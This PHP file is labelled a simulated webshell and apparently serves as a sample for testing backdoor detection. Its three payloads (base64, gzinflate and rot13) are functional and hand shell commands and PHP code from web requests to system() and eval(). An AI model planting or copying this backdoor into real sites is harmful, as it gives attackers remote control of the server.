<?php
/**
 * TEST FILE - SIMULATED WEBSHELL #2
 * Obfuscated PHP backdoor using base64 encoding
 * 
 * DANGER: This is for testing purposes only!
 */

// Base64 encoded eval - common obfuscation
$payload = base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==');
eval($payload);

// Gzinflate + base64 - deeper obfuscation
$code = gzinflate(base64_decode('S0ktTtZRKC4pysxLL0rNTQEA'));
eval($code);

// str_rot13 obfuscation
$x = str_rot13('riny($_CBFG["k"]);');
eval($x);
?>
